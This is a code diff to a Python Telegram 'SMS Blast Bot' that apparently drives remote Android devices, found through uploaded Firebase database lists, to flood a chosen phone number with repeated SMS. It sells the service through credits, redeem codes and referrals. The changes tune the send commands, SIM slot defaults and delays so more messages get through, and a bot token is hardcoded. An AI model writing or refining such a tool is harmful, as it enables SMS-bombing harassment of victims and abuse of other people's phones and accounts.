@@ -1,4 +1,4 @@
-import asyncio, json, os, time, logging, random, string, threading
+import asyncio, json, os, time, logging, random, string, threading, uuid
 from datetime import datetime
 from copy import deepcopy
 from collections import defaultdict
@@ -54,19 +54,15 @@ def sc(text: str) -> str:
     return text.translate(SMALL_CAPS_MAP)
 
 def em(emoji_id: str, fallback: str = "⭐") -> str:
-    """Emoji in TEXT — premium IDs work here safely."""
     if emoji_id:
         return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
     return fallback
 
-# ========== SAFE BUTTON BUILDERS (NO PREMIUM EMOJI IDs) ==========
 def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
-    """SAFE button — uses only normal emoji, no premium IDs (Telegram-safe)."""
     label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
     return InlineKeyboardButton(text=label, callback_data=callback_data)
 
 def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
-    """SAFE URL button — uses only normal emoji."""
     label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
     return InlineKeyboardButton(text=label, url=url)
 
@@ -92,17 +88,18 @@ BOT_TOKEN = "8384076414:AAGWXQr5F884Vel0mi0iQH0f9M2h5Z_ol-Y"
 LOG_CHANNEL_ID = -1002906755597
 
 _DATA_FILE = "blast_data.json"
-_VERSION = "v3.4-PREMIUM"
-_PROGRESS_UPDATE_INTERVAL = 2.0  # Increased from 1.0 to reduce Telegram load
-_BACKGROUND_SCAN_INTERVAL = 300.0  # ✅ FIX: 60s → 300s (5 minutes) to avoid rate limit
+_VERSION = "v3.5-PREMIUM"
+_PROGRESS_UPDATE_INTERVAL = 2.0
+_BACKGROUND_SCAN_INTERVAL = 300.0
 _SPEED_DEFAULT_DELAY = 0.3
 
-SPEED_FAST = 0.05
-SPEED_MEDIUM = 0.2
-SPEED_SLOW = 0.5
+# ✅ FIX: Speed values badle — Android app ko process karne ka time
+SPEED_FAST = 0.3       # 0.05 → 0.3 (6x slower)
+SPEED_MEDIUM = 0.5     # 0.2 → 0.5
+SPEED_SLOW = 1.0       # 0.5 → 1.0
 SPEED_DEFAULT = SPEED_MEDIUM
 
-# ========== SAFE EDIT / ANSWER / SEND HELPERS ==========
+# ========== SAFE HELPERS ==========
 async def safe_edit(message, text: str, reply_markup=None, parse_mode="HTML") -> bool:
     for attempt in range(3):
         try:
@@ -134,21 +131,7 @@ async def safe_answer(cq: CallbackQuery, text: str = None, show_alert: bool = Fa
             return False
     return False
 
-async def safe_send(bot: Bot, chat_id: int, text: str, **kwargs) -> bool:
-    for attempt in range(3):
-        try:
-            await bot.send_message(chat_id, text, **kwargs)
-            return True
-        except TelegramNetworkError as e:
-            log.warning(f"safe_send network (attempt {attempt+1}): {e}")
-            await asyncio.sleep(1.5 * (attempt + 1))
-        except Exception as e:
-            log.warning(f"safe_send error: {e}")
-            return False
-    return False
-
 async def send_fire_effect_private(bot: Bot, chat_id: int):
-    """Fire effect — safe, retries once on failure, silently skips on rate limit."""
     try:
         async with aiohttp.ClientSession() as session:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -406,9 +389,9 @@ def kb(*rows) -> InlineKeyboardMarkup:
 def speed_kb(prefix: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text=f"🚀 {sc('fast')}", callback_data=f"{prefix}:speed:fast"),
-            InlineKeyboardButton(text=f"⚡ {sc('medium')}", callback_data=f"{prefix}:speed:medium"),
-            InlineKeyboardButton(text=f"🐢 {sc('slow')}", callback_data=f"{prefix}:speed:slow"),
+            InlineKeyboardButton(text=f"🚀 {sc('fast')} (0.3s)", callback_data=f"{prefix}:speed:fast"),
+            InlineKeyboardButton(text=f"⚡ {sc('medium')} (0.5s)", callback_data=f"{prefix}:speed:medium"),
+            InlineKeyboardButton(text=f"🐢 {sc('slow')} (1s)", callback_data=f"{prefix}:speed:slow"),
         ],
         [InlineKeyboardButton(text=f"❌ {sc('cancel')}", callback_data=f"{prefix}:home")]
     ])
@@ -465,7 +448,6 @@ async def background_firebase_scanner(bot: Bot):
 
     log.info("Background Firebase Scanner STARTED (interval: 5 min)")
     first_scan_done = False
-    # Delay initial scan to avoid startup flood
     await asyncio.sleep(30)
 
     while True:
@@ -505,17 +487,6 @@ async def background_firebase_scanner(bot: Bot):
                     "last_update": int(time.time())
                 }
             LAST_SCAN_TIME = time.time()
-
-            health_entry = {
-                "timestamp": int(time.time()),
-                "devices_found": len(devices),
-                "dbs_scanned": len(fbs),
-                "duration_sec": round(scan_duration, 2),
-                "status": "healthy" if devices else "no_devices"
-            }
-            DEVICE_HEALTH_LOG.append(health_entry)
-            if len(DEVICE_HEALTH_LOG) > 100:
-                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]
 
             if devices:
                 SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
@@ -570,7 +541,6 @@ async def fb_get(base_url: str, path: str) -> dict:
     return {}
 
 async def fb_put(base_url: str, path: str, payload: dict) -> bool:
-    """✅ CRITICAL: Sends FULL message (no character limit)."""
     url = base_url.rstrip("/") + path
     for attempt in range(3):
         try:
@@ -584,12 +554,16 @@ async def fb_put(base_url: str, path: str, payload: dict) -> bool:
     return False
 
 def device_is_online(device_data: dict) -> bool:
-    return any([
-        device_data.get("isOnline"),
-        device_data.get("online"),
-        device_data.get("connected"),
-        device_data.get("status") in ("online", "active", True, 1)
-    ])
+    # ✅ FIX: Exact boolean checks
+    if device_data.get("status") is True:
+        return True
+    if device_data.get("isOnline") is True:
+        return True
+    if device_data.get("online") is True:
+        return True
+    if device_data.get("connected") is True:
+        return True
+    return False
 
 async def get_all_online_devices(d: dict) -> list:
     fbs = d.get("firebases", [])
@@ -600,7 +574,6 @@ async def get_all_online_devices(d: dict) -> list:
     global CACHED_DEVICES
     CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
 
-    # ✅ FIX: Reduced from 15 to 3 to avoid Telegram rate limits
     _dev_sem = asyncio.Semaphore(3)
 
     async def fetch_one(fb: dict):
@@ -628,7 +601,7 @@ async def get_all_online_devices(d: dict) -> list:
                                             return None
                                         dev_data = json.loads(txt2)
                                         if isinstance(dev_data, dict) and device_is_online(dev_data):
-                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
+                                            name = dev_data.get("deviceName") or dev_data.get("modelName") or dev_data.get("name") or dev_id[:16]
                                             sims = dev_data.get("sims", [])
                                             return {
                                                 "fb_id": fb["id"],
@@ -658,16 +631,21 @@ async def get_all_online_devices(d: dict) -> list:
     return results
 
 async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
-    """✅ CRITICAL: Sends FULL custom message without truncation."""
+    # ✅ FIX 1: ISO timestamp (string) instead of integer
+    # ✅ FIX 2: Unique smsId per SMS to prevent overwrite
+    unique_id = f"{int(time.time() * 1000)}_{uuid.uuid4().hex[:8]}"
+
     return await fb_put(
         fb_url,
         f"/clients/{dev_id}/webhookEvent/sendSms.json",
         {
             "from": sim_slot,
             "to": to.strip(),
-            "message": message.strip(),  # FULL message, no limit
+            "message": message.strip(),
             "isSended": False,
-            "timestamp": int(time.time())
+            "timestamp": datetime.now().isoformat(),   # ✅ ISO string format
+            "smsId": unique_id,                         # ✅ Unique ID
+            "batchId": unique_id                        # ✅ Unique batch
         }
     )
 
@@ -801,7 +779,6 @@ def user_home_text(uid: int, d: dict) -> str:
         f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
     )
 
-# ========== OWNER KEYBOARD (NO PREMIUM EMOJI IDs) ==========
 def owner_kb(d: dict) -> InlineKeyboardMarkup:
     mode_btn_text = f"🔴 {sc('disable free mode')}" if d.get("free_mode") else f"🟢 {sc('enable free mode')}"
     mode_btn_data = "owner:free:off" if d.get("free_mode") else "owner:free:on"
@@ -1001,7 +978,7 @@ def api_stats_text(d: dict) -> str:
 
 R = Router()
 
-# ========== /start — ALWAYS shows appropriate panel based on role ==========
+# ========== /start ==========
 @R.message(CommandStart(deep_link=True))
 async def cmd_start_deep(msg: Message, state: FSMContext):
     await state.clear()
@@ -1049,7 +1026,7 @@ async def cmd_start_deep(msg: Message, state: FSMContext):
     await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
 
     if is_banned(uid, d):
-        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
         return
 
     if is_owner(uid, d):
@@ -1091,10 +1068,10 @@ async def cmd_start(msg: Message, state: FSMContext):
         await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
         return
 
-    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
+    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!")
 
     if is_banned(uid, d):
-        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
         return
 
     if is_owner(uid, d):
@@ -1104,7 +1081,7 @@ async def cmd_start(msg: Message, state: FSMContext):
         await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
         return
     if not can_use(uid, d):
-        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>", parse_mode="HTML")
         return
 
     await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
@@ -1121,7 +1098,7 @@ async def fj_check(cq: CallbackQuery, state: FSMContext):
         except: pass
         return
     await safe_answer(cq, "✅ Verified!", show_alert=True)
-    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.")
+    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome!")
     if is_owner(uid, d):
         await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
     elif is_admin(uid, d):
@@ -1129,7 +1106,7 @@ async def fj_check(cq: CallbackQuery, state: FSMContext):
     else:
         await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
 
-# ========== USER FLOWS ==========
+# ========== USER SEND ==========
 @R.callback_query(F.data == "user:send")
 async def user_send_start(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -1156,14 +1133,14 @@ async def user_got_number(msg: Message, state: FSMContext):
         await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
         return
     if number in PROTECTED_NUMBERS:
-        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\nSirf Owner/Super Admin bhej sakte hain.", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML")
         return
     await state.update_data(number=number)
     await state.set_state(S.send_message)
     await msg.answer(
         f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
         f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
-        f"Jo message bhejna hai woh type karo (koi limit nahi):",
+        f"Jo message bhejna hai woh type karo:",
         reply_markup=kb([(f"❌ {sc('cancel')}", "user:cancel")]),
         parse_mode="HTML"
     )
@@ -1224,7 +1201,7 @@ async def user_got_count(msg: Message, state: FSMContext):
     if not is_admin(uid, d) and not is_owner(uid, d):
         current_credits = get_user_credits(uid, d)
         if current_credits <= 0:
-            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Credits nahi hain!</b>\nAdmin se contact karein.",
+            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Credits nahi hain!</b>",
                              reply_markup=kb([(f"🏠 {sc('home')}", "user:home")]), parse_mode="HTML")
             return
         if count > current_credits:
@@ -1250,7 +1227,7 @@ async def owner_send_start(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq.message,
         f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
         f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
-        f"Jis number pe SMS bhejna hai woh enter karo:",
+        f"Jis number pe SMS bhejna hai:",
         reply_markup=kb([(f"❌ {sc('cancel')}", "owner:home")])
     )
 
@@ -1258,14 +1235,14 @@ async def owner_send_start(cq: CallbackQuery, state: FSMContext):
 async def owner_got_number(msg: Message, state: FSMContext):
     number = msg.text.strip()
     if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number:", parse_mode="HTML")
         return
     await state.update_data(number=number)
     await state.set_state(S.owner_send_message)
     await msg.answer(
         f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
         f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
-        f"Jo message bhejna hai woh type karo (koi limit nahi):",
+        f"Jo message bhejna hai:",
         reply_markup=kb([(f"❌ {sc('cancel')}", "owner:home")]),
         parse_mode="HTML"
     )
@@ -1309,7 +1286,7 @@ async def owner_got_count(msg: Message, state: FSMContext):
         count = int(msg.text.strip())
         if count < 1: raise ValueError
     except:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number:", parse_mode="HTML")
         return
     await state.clear()
     number = fsmd.get("number", "")
@@ -1335,7 +1312,7 @@ async def admin_send_start(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq.message,
         f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
         f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
-        f"Jis number pe SMS bhejna hai woh enter karo:",
+        f"Jis number pe SMS bhejna hai:",
         reply_markup=kb([(f"❌ {sc('cancel')}", "admin:home")])
     )
 
@@ -1343,7 +1320,7 @@ async def admin_send_start(cq: CallbackQuery, state: FSMContext):
 async def admin_got_number(msg: Message, state: FSMContext):
     number = msg.text.strip()
     if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number:", parse_mode="HTML")
         return
     if number in PROTECTED_NUMBERS:
         protector_uid = PROTECTED_NUMBERS[number]
@@ -1355,7 +1332,7 @@ async def admin_got_number(msg: Message, state: FSMContext):
     await msg.answer(
         f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
         f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
-        f"Jo message bhejna hai woh type karo (koi limit nahi):",
+        f"Jo message bhejna hai:",
         reply_markup=kb([(f"❌ {sc('cancel')}", "admin:home")]),
         parse_mode="HTML"
     )
@@ -1399,7 +1376,7 @@ async def admin_got_count(msg: Message, state: FSMContext):
         count = int(msg.text.strip())
         if count < 1: raise ValueError
     except:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number:", parse_mode="HTML")
         return
     await state.clear()
     number = fsmd.get("number", "")
@@ -1464,7 +1441,11 @@ async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: 
                 fb_url = device["fb_url"]
                 dev_id = device["dev_id"]
                 sims = device["sims"]
-                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
+                # ✅ FIX: Default sim index = 1 (not 0)
+                if sims:
+                    sim_slots = [s.get("simSlotIndex", 1) for s in sims]
+                else:
+                    sim_slots = [1]
                 device_quota = min(3, msgs_left)
                 device_sent = 0
                 for sim in sim_slots:
@@ -1511,6 +1492,7 @@ async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: 
                             except TelegramNetworkError:
                                 pass
                             last_update_time = now
+                    # ✅ FIX: Delay badhaya — Android app ko process karne ka time
                     await asyncio.sleep(speed)
         except Exception as e:
             log.error(f"Send loop error for {uid}: {e}")
@@ -1640,7 +1622,7 @@ async def user_stop_send(cq: CallbackQuery, state: FSMContext):
         )
     except: pass
 
-# ========== VIDEO MANAGEMENT ==========
+# ========== VIDEO ==========
 @R.callback_query(F.data == "owner:videos:menu")
 async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -1720,7 +1702,7 @@ async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
         await safe_answer(cq, "❌ Koi video available nahi!", show_alert=True)
         return
     await safe_answer(cq, "📹 Sending video...")
-    await send_random_video(cq.bot, cq.message.chat.id, caption=f"📹 Enjoy your video!")
+    await send_random_video(cq.bot, cq.message.chat.id, caption=f"📹 Enjoy!")
 
 # ========== PROTECT NUMBER ==========
 @R.callback_query(F.data == "owner:protect")
@@ -1800,7 +1782,7 @@ async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
         rows.append([InlineKeyboardButton(text=f"🗑 {number}", callback_data=f"owner:protected_del:{number}")])
     rows.append([InlineKeyboardButton(text=f"🔙 {sc('back')}", callback_data="owner:protected_list")])
     await safe_edit(cq.message,
-        f"🗑 <b>Remove Protected Number</b>\n\nKaunsa number hatana hai?",
+        f"🗑 <b>Remove Protected Number</b>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
     )
 
@@ -1880,7 +1862,7 @@ async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
         return
     await state.set_state(S.add_all_credits_amount)
     await safe_edit(cq.message,
-        f"💰 <b>Add Credits to ALL Users</b>\n\nKitne credits sabhi users ko dena hai?\n<i>Example: 10</i>",
+        f"💰 <b>Add Credits to ALL Users</b>\n\nKitne credits sabhi users ko dena hai?",
         reply_markup=kb([(f"❌ {sc('cancel')}", "owner:home")])
     )
 
@@ -1907,11 +1889,7 @@ async def owner_add_all_credits_done(msg: Message, state: FSMContext):
         add_credits(int(uid_str), amount, d)
         count += 1
     save(d)
-    notification = (
-        f"💰 <b>Credits Added!</b>\n\n"
-        f"🎉 Aapko <b>{amount}</b> credits mile hain!\n"
-        f"💳 Balance check karein /start"
-    )
+    notification = f"💰 <b>Credits Added!</b>\n\n🎉 Aapko <b>{amount}</b> credits mile hain!"
     success = 0
     for uid_str in users:
         try:
@@ -1920,10 +1898,7 @@ async def owner_add_all_credits_done(msg: Message, state: FSMContext):
             await asyncio.sleep(0.05)
         except: pass
     await msg.answer(
-        f"✅ <b>Credits Added to All Users!</b>\n\n"
-        f"💰 {amount} credits each\n"
-        f"👥 Total: <b>{count}</b>\n"
-        f"📨 Notified: <b>{success}</b>",
+        f"✅ <b>Credits Added to All Users!</b>\n\n💰 {amount} each\n👥 Total: <b>{count}</b>\n📨 Notified: <b>{success}</b>",
         reply_markup=kb([(f"🔙 {sc('back')}", "owner:home")]), parse_mode="HTML"
     )
     log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")
@@ -1936,8 +1911,7 @@ async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
         return
     await state.set_state(S.deduct_all_credits_amount)
     await safe_edit(cq.message,
-        f"💰 <b>Deduct Credits from ALL Users</b>\n\nKitne credits katne hain?\n<i>Example: 5</i>\n\n"
-        f"⚠️ <i>Owners/Admins se nahi katenge. Notification nahi jayegi.</i>",
+        f"💰 <b>Deduct Credits from ALL Users</b>\n\nKitne credits katne hain?",
         reply_markup=kb([(f"❌ {sc('cancel')}", "owner:home")])
     )
 
@@ -1979,11 +1953,7 @@ async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
                 total_deducted += current
     save(d)
     await msg.answer(
-        f"✅ <b>Credits Deducted!</b>\n\n"
-        f"💰 {amount} each\n"
-        f"👥 Users: <b>{count}</b>\n"
-        f"💳 Total: <b>{total_deducted}</b>\n"
-        f"👑 Owners/Admins: <b>Skipped</b>",
+        f"✅ <b>Credits Deducted!</b>\n\n💰 {amount} each\n👥 Users: <b>{count}</b>\n💳 Total: <b>{total_deducted}</b>",
         reply_markup=kb([(f"🔙 {sc('back')}", "owner:home")]), parse_mode="HTML"
     )
     log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits")
@@ -2001,7 +1971,7 @@ async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
         return
     current_credits = get_user_credits(uid, d)
     if current_credits < 2:
-        await safe_answer(cq, "❌ Minimum 2 credits chahiye!", show_alert=True)
+        await safe_answer(cq, "❌ Minimum 2 credits!", show_alert=True)
         return
     await state.set_state(S.transfer_credits_uid)
     await safe_edit(cq.message,
@@ -2028,7 +1998,7 @@ async def user_transfer_uid(msg: Message, state: FSMContext):
         return
     current_credits = get_user_credits(uid, d)
     if current_credits < 2:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits!", parse_mode="HTML")
         return
     await state.update_data(transfer_target=target_uid)
     await state.set_state(S.transfer_credits_amount)
@@ -2050,7 +2020,7 @@ async def user_transfer_amount(msg: Message, state: FSMContext):
         amount = int(msg.text.strip())
         if amount <= 0: raise ValueError
     except:
-        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number:", parse_mode="HTML")
         return
     fsmd = await state.get_data()
     target_uid = fsmd.get("transfer_target")
@@ -2067,17 +2037,11 @@ async def user_transfer_amount(msg: Message, state: FSMContext):
     await state.clear()
     try:
         await msg.bot.send_message(target_uid,
-            f"💸 <b>Credits Received!</b>\n\n"
-            f"👤 From: <code>{uid}</code>\n"
-            f"💰 Amount: <b>{amount}</b>\n"
-            f"💳 Balance: <b>{get_user_credits(target_uid, d)}</b>",
+            f"💸 <b>Credits Received!</b>\n\n👤 From: <code>{uid}</code>\n💰 Amount: <b>{amount}</b>\n💳 Balance: <b>{get_user_credits(target_uid, d)}</b>",
             parse_mode="HTML")
     except: pass
     await msg.answer(
-        f"✅ <b>Transfer Successful!</b>\n\n"
-        f"👤 To: <code>{target_uid}</code>\n"
-        f"💰 Amount: <b>{amount}</b>\n"
-        f"💳 Balance: <b>{get_user_credits(uid, d)}</b>",
+        f"✅ <b>Transfer Successful!</b>\n\n👤 To: <code>{target_uid}</code>\n💰 Amount: <b>{amount}</b>\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
         reply_markup=kb([(f"🏠 {sc('home')}", "user:home")]), parse_mode="HTML"
     )
     log_activity(d, "credit_transfer", uid, f"Transferred {amount} to {target_uid}")
@@ -2092,7 +2056,7 @@ async def owner_home(cq: CallbackQuery, state: FSMContext):
         return
     await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d))
 
-# ========== FIREBASE MANAGEMENT ==========
+# ========== FIREBASE ==========
 @R.callback_query(F.data.startswith("owner:fb:menu"))
 async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2215,10 +2179,7 @@ async def owner_fb_add_file_done(msg: Message, state: FSMContext):
     save(d)
     await state.clear()
     await msg.answer(
-        f"✅ <b>Firebase TXT Processed!</b>\n\n"
-        f"🔥 Added: <b>{added_count}</b>\n"
-        f"⚠️ Skipped: <b>{skipped_count}</b>\n"
-        f"📊 Total: <b>{len(fbs)}</b>",
+        f"✅ <b>Firebase TXT Processed!</b>\n\n🔥 Added: <b>{added_count}</b>\n⚠️ Skipped: <b>{skipped_count}</b>\n📊 Total: <b>{len(fbs)}</b>",
         reply_markup=fb_menu_kb(load()), parse_mode="HTML"
     )
 
@@ -2256,15 +2217,7 @@ async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
         await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await safe_answer(cq, "⏳ Fetching...")
-    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
-    global CACHED_DEVICES, FB_DEVICE_COUNTS
-    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
-    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
-    for k in stale:
-        FB_DEVICE_COUNTS.pop(k, None)
     devices = get_cached_devices()
-    if not devices:
-        devices = await get_all_online_devices(d)
     stats_text = api_stats_text(d)
     dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
     if not devices:
@@ -2281,7 +2234,7 @@ async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
         (f"🔙 {sc('back')}", "owner:home")
     ]))
 
-# ========== OWNERS/ADMINS MANAGEMENT ==========
+# ========== OWNERS/ADMINS ==========
 @R.callback_query(F.data == "owner:owners:menu")
 async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2346,7 +2299,7 @@ async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
         await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
-        await safe_answer(cq, "❌ Main owner remove nahi ho sakta!", show_alert=True)
+        await safe_answer(cq, "❌ Main owner remove nahi!", show_alert=True)
         return
     if del_id in d["owners"]:
         d["owners"].remove(del_id)
@@ -2402,7 +2355,7 @@ async def owner_admins_add_done(msg: Message, state: FSMContext):
     await msg.answer(f"✅ <b>Admin Added!</b>\n<code>{new_id}</code>",
                      reply_markup=admins_menu_kb(load()), parse_mode="HTML")
     try:
-        await msg.bot.send_message(new_id, f"🛡 <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
+        await msg.bot.send_message(new_id, f"🛡 <b>Aapko Admin bana diya gaya!</b>", parse_mode="HTML")
     except: pass
 
 @R.callback_query(F.data.startswith("owner:admins:del:"))
@@ -2422,7 +2375,7 @@ async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
         reply_markup=admins_menu_kb(d)
     )
 
-# ========== FREE MODE TOGGLE ==========
+# ========== FREE MODE ==========
 @R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
 async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
     await state.clear()
@@ -2584,7 +2537,7 @@ async def panel_broadcast_do(msg: Message, state: FSMContext):
         reply_markup=back_kb, parse_mode="HTML"
     )
 
-# ========== EXPORT SCRIPT ==========
+# ========== EXPORT ==========
 @R.callback_query(F.data == "owner:export_script")
 async def owner_export_script(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2623,8 +2576,6 @@ async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
         return
     await safe_answer(cq, "⏳ Fetching...")
     devices = get_cached_devices()
-    if not devices:
-        devices = await get_all_online_devices(d)
     stats_text = api_stats_text(d)
     dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
     if not devices:
@@ -2888,7 +2839,7 @@ async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
     await safe_answer(cq, "🗑 Plan removed!")
     await owner_pricing_menu(cq, state)
 
-# ========== REDEEM CODES ==========
+# ========== REDEEM ==========
 @R.callback_query(F.data == "owner:redeem:menu")
 async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2994,7 +2945,7 @@ async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
     await safe_answer(cq, "🗑 Code deleted!")
     await owner_redeem_menu(cq, state)
 
-# ========== CREDITS ADD/DEDUCT ==========
+# ========== CREDITS ==========
 @R.callback_query(F.data == "owner:credits:add")
 async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -3151,7 +3102,7 @@ async def owner_settings_ref_done(msg: Message, state: FSMContext):
     await msg.answer(f"✅ <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
                      reply_markup=kb([(f"🔙 {sc('back')}", "owner:settings")]), parse_mode="HTML")
 
-# ========== ACTIVITY LOG ==========
+# ========== ACTIVITY/LOG ==========
 @R.callback_query(F.data == "owner:activity")
 async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -3183,7 +3134,7 @@ async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
         return
     all_history = d.get("sms_history", {})
     total_entries = sum(len(v) for v in all_history.values())
